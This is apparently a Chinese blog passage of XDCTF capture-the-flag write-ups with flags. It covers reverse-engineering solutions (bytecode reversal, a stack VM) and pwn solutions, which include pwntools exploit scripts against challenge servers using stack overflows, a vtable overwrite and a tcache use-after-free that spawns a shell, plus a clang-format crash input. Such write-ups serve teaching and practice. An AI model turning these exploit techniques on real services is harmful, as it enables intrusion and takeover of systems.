class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">18</span>; i++)&#123;</span><br><span class="line">        srand(rand());</span><br><span class="line">        <span class="keyword">unsigned</span> <span class="keyword">char</span> s = rand();</span><br><span class="line">        <span class="built_in">putchar</span>(s ^ <span class="keyword">xor</span>[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">putchar</span>(<span class="string">&#x27;\n&#x27;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>flag{Exca1i6ur!!!}</p></blockquote><h3 id="题目忘了"><a href="#题目忘了" class="headerlink" title="题目忘了"></a>题目忘了</h3><a download href="/archives/xdctf/re4.7z" style="display: block;"><span class="iconfont icon-archive-c"></span>附件下载</a><div class="tabs" id="方法"><ul class="nav-tabs"><li class="tab active"><button type="button" data-href="#方法-1">方法 1</button></li><li class="tab"><button type="button" data-href="#方法-2">方法 2</button></li></ul><div class="tab-contents"><div class="tab-item-content active" id="方法-1"><p>一看程序反编译结果, 不像是直接用 C 写的. 顺着<code>start</code>往里面看, 可以看到这些字符串:<br><img src="/pictures/xdctf_re4_0.png" alt="反编译的函数"><br>看到了 OCRA, 猜测是 ruby 写的.<br>在网上寻找 OCRA 怎么反编译, 无果. 猜测 exe 是释放脚本并运行(以前某 bat2exe 就是这么做的).<br>打开程序挂着, 使用 Everything 搜索 <code>.rb</code>, 按修改时间排序, 果然在临时目录有很多<code>*.rb</code>文件<br><img src="/pictures/xdctf_re4_1.png" alt="源文件"><br>打开目录, 容易在<code>(root)/src/</code>找到<code>chall.rb</code>文件, 然后就简单了.</p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div><div class="tab-item-content" id="方法-2"><p>一条捷径: 运行程序并输入<kbd>CTRL</kbd>+<kbd>Z</kbd>并回车, 可以看到源文件 <code>chall.rb</code>.<br><img src="/pictures/xdctf_re4_2.png" alt="源文件_"></p><button type="button" class="tab-to-top" aria-label="scroll to top"><i class="fas fa-arrow-up"></i></button></div></div></div><p>两次 base64 解密即可</p><blockquote><p>flag{1llyasviel_v0n_E1nz6ern}</p></blockquote><h3 id="题目忘了-2"><a href="#题目忘了-2" class="headerlink" title="题目忘了*2"></a>题目忘了*2</h3><a download href="/archives/xdctf/re5.7z" style="display: block;"><span class="iconfont icon-archive-c"></span>附件下载</a><p>题目给出了主程序和一个 <code>.pyc</code>, 显然我们需要逆向这个 python3.10 的字节码.<br>在网上找了一圈, 好像没有直接反编译成 <code>.py</code> 的反编译器, 最多找到个反编译成类似汇编代码的方法:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> dis</span><br><span class="line">dis.dis(DataFrame)</span><br></pre></td></tr></table></figure><p>得到的结果: <a href="/archives/xdctf/pyc.txt">查看</a><br>然后就以上面的代码为参考, 一句一句逆出来, 遇到汇编不对的就把自己那一句话改一改.<br>《易得》</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DataFrame</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, flag</span>):</span></span><br><span class="line">        self.flag = (<span class="keyword">lambda</span> data : data + <span class="built_in">bytes</span>([<span class="number">16</span>-<span class="built_in">len</span>(data)%<span class="number">16</span>] * (<span class="number">16</span>-<span class="built_in">len</span>(data)%<span class="number">16</span>)))(flag)</span><br><span class="line">        self.key = <span class="string">&#x27;trackonyou&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">enc</span>(<span class="params">self</span>):</span></span><br><span class="line">        S = []</span><br><span class="line">        T = []</span><br><span class="line">        NEW = [<span class="number">0</span>] * <span class="number">64</span></span><br><span class="line">        sec_to_plain = <span class="built_in">list</span>(self.flag)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            S.append(<span class="number">255</span> - i)</span><br><span class="line">            T.append(<span class="built_in">ord</span>(self.key[i % <span class="built_in">len</span>(self.key)]))</span><br><span class="line"></span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            j = (j + S[i] + T[i]) % <span class="number">256</span></span><br><span class="line">            S[i], S[j] = S[j], S[i]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> cnt <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            <span class="comment"># May some comment</span></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">                sec_to_plain[i] = S[sec_to_plain[i]]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">                    tmp = sec_to_plain[<span class="number">8</span> * i + j]</span><br><span class="line">                    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">                        NEW[k + <span class="number">8</span> * j] = tmp % <span class="number">2</span></span><br><span class="line">                        tmp = tmp // <span class="number">2</span></span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">                    res = j * j * j % <span class="number">67</span> % <span class="number">64</span></span><br><span class="line">                    NEW[res], NEW[j] = NEW[j], NEW[res]</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">                    v78 = <span class="number">0</span></span><br><span class="line">                    v74 = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">                        v78 |= NEW[k + <span class="number">8</span> * j] * v74</span><br><span class="line">                        v74 *= <span class="number">2</span></span><br><span class="line">                    v70 = j + <span class="number">8</span> * i</span><br><span class="line">                    sec_to_plain[v70] = v78</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">                sec_to_plain[i] ^= <span class="built_in">ord</span>(self.key[cnt])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sec_to_plain</span><br></pre></td></tr></table></figure><p>我敢保证行数都是一样的<img no-lazy style="display: inline; zoom: 0.5; margin: 0;" src="/pictures/bili-small-shrink/7/156.png" alt="[蛆音娘_滑稽]"></img><br>然后就按照源码写出顺序相反的代码:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DataFrame</span>(<span class="params"><span class="built_in">object</span></span>):</span></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self, flag</span>):</span></span><br><span class="line">        self.flag = (<span class="keyword">lambda</span> data : data + <span class="built_in">bytes</span>([<span class="number">16</span>-<span class="built_in">len</span>(data)%<span class="number">16</span>] * (<span class="number">16</span>-<span class="built_in">len</span>(data)%<span class="number">16</span>)))(flag)</span><br><span class="line">        self.key = <span class="string">&#x27;trackonyou&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">dec</span>(<span class="params">self</span>):</span></span><br><span class="line">        S = []</span><br><span class="line">        T = []</span><br><span class="line">        NEW = [<span class="number">0</span>] * <span class="number">64</span></span><br><span class="line">        sec_to_plain = <span class="built_in">list</span>(self.flag)</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            S.append(<span class="number">255</span> - i)</span><br><span class="line">            T.append(<span class="built_in">ord</span>(self.key[i % <span class="built_in">len</span>(self.key)]))</span><br><span class="line"></span><br><span class="line">        j = <span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            j = (j + S[i] + T[i]) % <span class="number">256</span></span><br><span class="line">            S[i], S[j] = S[j], S[i]</span><br><span class="line">        T = [<span class="number">0</span>] * <span class="number">256</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            T[S[i]] = i</span><br><span class="line">        S = T</span><br><span class="line"></span><br><span class="line">        <span class="keyword">for</span> cnt <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">10</span>):</span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">                sec_to_plain[i] ^= <span class="built_in">ord</span>(self.key[<span class="number">9</span> - cnt])</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">                    tmp = sec_to_plain[<span class="number">8</span> * i + j]</span><br><span class="line">                    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">                        NEW[k + <span class="number">8</span> * j] = tmp % <span class="number">2</span></span><br><span class="line">                        tmp = tmp // <span class="number">2</span></span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">                    j = <span class="number">63</span> - j</span><br><span class="line">                    res = j * j * j % <span class="number">67</span> % <span class="number">64</span></span><br><span class="line">                    NEW[res], NEW[j] = NEW[j], NEW[res]</span><br><span class="line">                <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">                    v78 = <span class="number">0</span></span><br><span class="line">                    v74 = <span class="number">1</span></span><br><span class="line">                    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">                        v78 |= NEW[k + <span class="number">8</span> * j] * v74</span><br><span class="line">                        v74 *= <span class="number">2</span></span><br><span class="line">                    v70 = j + <span class="number">8</span> * i</span><br><span class="line">                    sec_to_plain[v70] = v78</span><br><span class="line"></span><br><span class="line">            <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">                sec_to_plain[i] = S[sec_to_plain[i]]</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> sec_to_plain</span><br><span class="line"></span><br><span class="line">data = DataFrame(<span class="built_in">bytes</span>([<span class="number">34</span>, <span class="number">88</span>, <span class="number">205</span>, <span class="number">160</span>, <span class="number">220</span>, <span class="number">83</span>, <span class="number">10</span>, <span class="number">177</span>, <span class="number">84</span>, <span class="number">202</span>, <span class="number">92</span>, <span class="number">236</span>, <span class="number">170</span>, <span class="number">160</span>, <span class="number">226</span>, <span class="number">98</span>, <span class="number">63</span>, <span class="number">118</span>, <span class="number">177</span>, <span class="number">33</span>, <span class="number">188</span>, <span class="number">125</span>, <span class="number">192</span>, <span class="number">27</span>, <span class="number">240</span>, <span class="number">214</span>, <span class="number">205</span>, <span class="number">211</span>, <span class="number">255</span>, <span class="number">28</span>, <span class="number">247</span>, <span class="number">36</span>, <span class="number">195</span>, <span class="number">0</span>, <span class="number">158</span>, <span class="number">144</span>, <span class="number">153</span>, <span class="number">34</span>, <span class="number">80</span>, <span class="number">87</span>, <span class="number">45</span>, <span class="number">40</span>, <span class="number">125</span>, <span class="number">106</span>, <span class="number">214</span>, <span class="number">6</span>, <span class="number">187</span>, <span class="number">93</span>, <span class="number">189</span>, <span class="number">13</span>, <span class="number">61</span>, <span class="number">70</span>, <span class="number">43</span>, <span class="number">65</span>, <span class="number">180</span>, <span class="number">175</span>, <span class="number">52</span>, <span class="number">97</span>, <span class="number">144</span>, <span class="number">233</span>, <span class="number">125</span>, <span class="number">76</span>, <span class="number">60</span>, <span class="number">66</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(data.dec()))</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>flag{R3s3@rch_by73c0de_m@yb3_a_gO0d_way_2_l3a7n_python}</p></blockquote><h3 id="baby-vm"><a href="#baby-vm" class="headerlink" title="baby_vm"></a>baby_vm</h3><a download href="/archives/xdctf/vm.7z" style="display: block;"><span class="iconfont icon-archive-c"></span>附件下载</a><p><img src="/pictures/xdctf_re6_0.png" alt="主函数"></p><p>猜测有一个虚拟机类, 分析结果见<a href="/archives/xdctf/re6_anl.7z">文件</a><br>四条指令分别为 <code>0xF1</code> ~ <code>0xF4</code>.<br>根据虚拟机的四种指令执行对应操作, 写个脚本逆过来就行:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">flag = <span class="built_in">list</span>(<span class="string">b&#x27;flag&#123;xxxxxxxxxxxxxxxxx&#125;&#x27;</span>)</span><br><span class="line">pad = [<span class="number">0x20</span>, <span class="number">0x21</span>, <span class="number">0x22</span>, <span class="number">0x23</span>, <span class="number">0x24</span>, <span class="number">0x25</span>, <span class="number">0x26</span>, <span class="number">0x27</span>, <span class="number">0x28</span>, <span class="number">0x29</span>, <span class="number">0x2A</span>, <span class="number">0x2B</span>, <span class="number">0x2C</span>, <span class="number">0x2D</span>, <span class="number">0x2E</span>, <span class="number">0x2F</span>, <span class="number">0x30</span>, <span class="number">0x31</span>, <span class="number">0x32</span>, <span class="number">0x33</span>, <span class="number">0x34</span>, <span class="number">0x35</span>, <span class="number">0x36</span>]</span><br><span class="line">flag = flag + pad + [<span class="number">0</span>] * <span class="number">24</span></span><br><span class="line">ans = [<span class="number">0</span>] * <span class="number">23</span> + pad + [<span class="number">0x66</span>, <span class="number">0x58</span>, <span class="number">0x07</span>, <span class="number">0x46</span>, <span class="number">0x6A</span>, <span class="number">0x74</span>, <span class="number">0x68</span>, <span class="number">0x45</span>, <span class="number">0x4D</span>, <span class="number">0x59</span>, <span class="number">0x58</span>, <span class="number">0x51</span>, <span class="number">0x62</span>, <span class="number">0x4A</span>, <span class="number">0x52</span>, <span class="number">0x61</span>, <span class="number">0x6C</span>, <span class="number">0x60</span>, <span class="number">0x16</span>, <span class="number">0x15</span>, <span class="number">0x16</span>, <span class="number">0x56</span>, <span class="number">0x06</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">23</span>): <span class="comment"># 加密过程</span></span><br><span class="line">    flag[<span class="number">46</span> + i] = flag[i] ^ flag[<span class="number">23</span> + i] ^ <span class="number">17</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">23</span>): <span class="comment"># 照猫画虎的解密过程</span></span><br><span class="line">    ans[<span class="number">22</span> - i] = ans[<span class="number">68</span> - i] ^ ans[<span class="number">45</span> - i] ^ <span class="number">17</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>([<span class="built_in">hex</span>(flag[<span class="number">0x2E</span> + i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">24</span>)])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">bytes</span>(ans[:<span class="number">23</span>]))</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>flag{Wh4t_@_stack_vm_M@573r!}</p></blockquote><h3 id="Rx-的烦恼"><a href="#Rx-的烦恼" class="headerlink" title="Rx 的烦恼"></a>Rx 的烦恼</h3><a download href="/archives/xdctf/EasyCpp.7z" style="display: block;"><span class="iconfont icon-archive-c"></span>附件下载</a><p>呃这题没做出来就不贴了, 看了看题解感觉还是想多了, 之前看完流程感觉应该没有flag, 然后一直想着是不是要故意触发异常跳到一个特殊的位置解密<code>magic</code>.</p><p>下面是一个分析的半成品:</p><a download href="/archives/xdctf/easycpp_halfway.7z" style="display: block;"><span class="iconfont icon-archive-c"></span>文件下载</a><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><p>抱着捞分的心态做了几个题<img no-lazy style="display: inline; zoom: 0.5; margin: 0;" src="/pictures/bili-small-shrink/1/27.png" alt="[滑稽]"></img></p><h3 id="clang-format"><a href="#clang-format" class="headerlink" title="clang-format"></a>clang-format</h3><blockquote><p>请找出让 clang_format 13.0 崩溃的 cpp 代码, 把代码转为 base64 发送到链接:<br><a href="http://150.158.88.195:58888/format/?your_base64">http://150.158.88.195:58888/format/?your_base64</a></p></blockquote><p>题目要求找出<code>clang-format</code>13.0 的漏洞, 既然给的是官方文件, 那肯定会有对应的 bug report. 于是我们可以去网上找相关数据, 这里给出我找到的: <a href="https://www.mail-archive.com/llvm-bugs@lists.llvm.org/mail4.html">这个网站</a>中的<a href="https://www.mail-archive.com/llvm-bugs@lists.llvm.org/msg54898.html">这个邮件</a></p><p>使用:<br><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">std::vector&lt;std::vector&lt;<span class="keyword">uint8_t</span>&gt;&gt; var_len_seq&#123; &#123; <span class="number">0x80</span> &#125;, &#123; <span class="number">0xf5</span> &#125;, &#123; <span class="number">0xc3</span>, <span class="number">0x7f</span> &#125;, &#123; <span class="number">0xc3</span>, <span class="number">0xc0</span> &#125;, &#123; <span class="number">0xe1</span>, <span class="number">0x7f</span> &#125;, &#123; <span class="number">0xe1</span>, <span class="number">0xc0</span> &#125;, &#123; <span class="number">0xe1</span>, <span class="number">0x81</span>, <span class="number">0x7f</span> &#125;, &#125;; </span><br></pre></td></tr></table></figure><br>去访问:<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://150.158.88.195:58888/format/?c3RkOjp2ZWN0b3I8c3RkOjp2ZWN0b3I8dWludDhfdD4+IHZhcl9sZW5fc2VxeyB7IDB4ODAgfSwgeyAweGY1IH0sIHsgMHhjMywgMHg3ZiB9LCB7IDB4YzMsIDB4YzAgfSwgeyAweGUxLCAweDdmIH0sIHsgMHhlMSwgMHhjMCB9LCB7IDB4ZTEsIDB4ODEsIDB4N2YgfSwgfTsg</span><br></pre></td></tr></table></figure></p><p>成功拿到 flag.</p><blockquote><p>flag{eXcel1Ent1Y_Cr4sH_cLanG-F0rm4t}</p></blockquote><h3 id="blind"><a href="#blind" class="headerlink" title="blind"></a>blind</h3><blockquote><p>就这种题, 我闭着眼睛也能打<br><code>nc sec.eqqie.cn 10012</code><br>你觉得呢?</p></blockquote><p>一个经典的栈溢出题, 直接造栈溢出, 管他长度是多少, 反正一直重复就对了:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&#x27;sec.eqqie.cn&#x27;</span>, <span class="number">10012</span>)</span><br><span class="line">b = p.recvline()</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">q = p64(<span class="built_in">int</span>(b[b.find(<span class="string">b&#x27;0x&#x27;</span>) + <span class="number">2</span> : -<span class="number">1</span>], <span class="number">16</span>))</span><br><span class="line">p.sendline(q * <span class="number">30</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>flag{I_believe_you_can_be_a_good_fuzzer}</p></blockquote><h3 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h3><blockquote><p><code>nc sec.eqqie.cn 10013</code><br><a download href="/archives/xdctf/signin.7z" style="display: block;"><span class="iconfont icon-archive-c"></span>附件下载</a></p></blockquote><p>整数溢出 + 栈溢出即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">    p = process(<span class="string">&#x27;./signin&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;sec.eqqie.cn&#x27;</span>, <span class="number">10013</span>)</span><br><span class="line"></span><br><span class="line">b = <span class="string">b&#x27;ZXFxaWUmY29yMWU=&#x27;</span></span><br><span class="line">b = b.ljust(<span class="number">0x89</span> + <span class="number">4</span>, <span class="string">b&#x27;a&#x27;</span>) + p32(<span class="number">0x80492B6</span>)</span><br><span class="line">b = b.ljust(<span class="number">0x100</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">p.sendline(b)</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>flag{try_t0_c0mb1n3_tw0_vulnerabilities_t0g3ther}</p></blockquote><h3 id="note"><a href="#note" class="headerlink" title="note"></a>note</h3><blockquote><p><code>nc 139.155.15.113 10000</code><br><a download href="/archives/xdctf/note.7z" style="display: block;"><span class="iconfont icon-archive-c"></span>附件下载</a></p></blockquote><p><code>new</code>分配的缓冲区大小为<code>0x1C</code>. 原理8太懂, 只知道经过测试两个两个地址间的距离为<code>0x20</code>. 这样的话我们可以通过一个<code>note</code>覆盖下一个<code>note</code>的虚函数表. 那么我们需要一块大小为4的内存指针, 且地址里存放了<code>system</code>函数指针. 这样下一条<code>note</code>调用虚函数时就可拿到shell.<br>在这里我们选择题目给的<code>gift</code>, 即先把此地址溢出填入<code>note</code>的虚函数表, 再在下一条<code>note</code>修改时输入<code>system</code>函数的地址.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p_bkd = <span class="number">0x80489CE</span></span><br><span class="line">o_src = <span class="number">0x28</span></span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"><span class="keyword">if</span> local:</span><br><span class="line">p = process(<span class="string">&#x27;./note&#x27;</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">p = remote(<span class="string">&#x27;139.155.15.113&#x27;</span>, <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">14</span>): p.recvline()</span><br><span class="line">q = <span class="built_in">int</span>(p.recvline()[<span class="number">16</span> : -<span class="number">1</span>], <span class="number">16</span>) + o_src</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(q))</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;0&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;28&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;a&#x27;</span> * <span class="number">24</span> + p32(q))</span><br><span class="line">p.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">p.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">p.sendline(p32(p_bkd))</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>flag{cpp_is_easy}</p></blockquote><h3 id="抗疫日记"><a href="#抗疫日记" class="headerlink" title="抗疫日记"></a>抗疫日记</h3><blockquote><p><code>nc sec.arttnba3.cn 10001</code><br><a download href="/archives/xdctf/diary.7z" style="display: block;"><span class="iconfont icon-archive-c"></span>附件下载</a></p></blockquote><p>这题可以利用的是野指针, 也就是旧指针在释放时没有将指针置零, 导致新内存分配到同一地址时导致意外修改.<br>对于高版本libc, 分配小内存先会从tcache中申请, 释放后回收, 等再次分配相同大小的内存时, 拿到的地址为上次释放的内存地址.<br>利用这一点, 我们先创建一条日记, 长度为16, 此时有两块内存, 指针为<code>p1</code>, <code>p2</code>. <code>p1</code>是对象的16字节内存, <code>p2</code>是缓冲区内存<br>再创建一条, 长度为其他数, 这里选择了96. 申请的内存指针为<code>p3</code>, <code>p4</code>. 含义同上<br>注意这时<code>p1</code>, <code>p2</code> 和 <code>p3</code>大小均为16字节, 而<code>p4</code>不是, 此时释放第一条日记, 再释放第二条日记. 现在tcache中链表为<code>p2</code>-&gt;<code>p1</code>-&gt;<code>p3</code>.<br>再创建一条日记, 此时拿到的指针为<code>p3</code>和<code>p1</code>, 此时就可在<code>p1</code>中随意写数据了. 向其中写入<code>/bin/sh</code>和<code>system</code>即可.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 